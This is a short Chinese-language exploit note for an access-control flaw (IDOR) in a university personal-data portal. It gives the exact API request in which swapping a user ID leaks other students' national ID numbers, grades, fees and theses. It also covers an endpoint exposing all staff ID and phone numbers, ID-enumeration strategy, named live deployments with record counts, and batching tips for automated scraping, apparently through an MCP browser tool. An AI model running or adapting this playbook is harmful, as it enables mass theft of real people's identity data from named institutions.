# 联奕 LY-IAP 个人数据中心 selectTableDetails IDOR (≤50行)

## 指纹
- URL 含 `/bdyzb/`（百度一站办）或路由 `#/myUserData/dataItemShow/<分类>/<bbh>`
- API 前缀 `/bdyzb/api/personaldata/myUserData/`
- React SPA；认证载体 httpOnly Cookie + 前端拦截器注入 appId:ly-dcp / loginUserId / departmentId

## 一击流程
```
1. 登录任意账号 → 打开个人数据页面 dataItemShow/21/<bbh>
2. 抓 selectTableDetails 请求，studentdataYhbh 从 null 改为目标编号
3. 响应 dataList[0].SFZJH 泄露身份证 → IDOR 成立
```

## 请求/响应
```json
POST /bdyzb/api/personaldata/myUserData/selectTableDetails
{"vo":[{"bbh":"3c94c9afc04e467e932095d1a463e4cf"}],"pageSize":10,"currentPage":1,"jcms":false,"studentdataYhbh":"<13位编号>"}
→ data.dataList[0] = {SFZJH,XM,BJMC,DWMC,CSRQ,SZNJ,XJZTDM,...}
```
- `null`=当前用户；指定编号=任意用户，**无归属校验**
- bbh 换值切表：学生基本信息 LY_MX_XS_JBXX / 考试成绩 LY_MX_XS_LNCJB / 缴费 LY_MX_JS_XSJFXXB / 论文 LY_MX_XS_XSLWXX

## 用户编号格式
`前缀4位 + 段号3位 + 000 + 序号3位`（13位）
- 前缀 2043/2143/2243（2343+ 空）；段号 101-300（301+ 空）；序号 000-999
- ⚠ **前缀 ≠ 年级**：同前缀混多届、段号跨前缀对应不同学院 → 别按年级猜，必须逐段扫
- 段号粗扫：每段测序号 000001；命中再二分边界（log2(1000)≈10次）

## 教职工统计
`POST <前缀>/personaldata/unit/queryPageUnitInfo` `{"type":"1","page":1,"pageSize":10}` → 学生账号读全校教职工（身份证/工号/手机号全泄露），type=1/2 相同，pageSize 上限10
- 前缀按部署：hnuu=`/bdyzb/api`，sxzymh=根域 `/api`（门户与业务应用共享 Cookie）
- total=861(hnuu)/2744(sxzymh)/3182(ynnu)

## 绕坑
- ⚠ 本实例认证 = `Authorization` cookie + HttpOnly `customsid` 双 cookie,缺一 302;`Bearer` header 方式被拒 → BP 必须用代理历史原始请求
- ⚠ 前端注入头含 `Departmentid`(学生班级部门),会使 `queryPageUnitInfo` 按部门过滤 → total=0;**删掉该头 → total=861**;selectTableDetails 不受其影响
- ⚠ 学号(JGH)即 `studentdataYhbh`,不用猜 13 位编号格式;河南/淮南类高职学号 `年份+部门+班级+序号` 连续可枚举
- MCP evaluate async fetch 恒返回 {} → 写 window.__xxx 二次读
- 同步 XHR 逐请求最稳；异步并发>100 全超时 → BATCH=12-15
- dataList 在 j.data.dataList 不是 j.dataList
- 解析代码少写一层 → 全判 EMPTY 误判"全空"
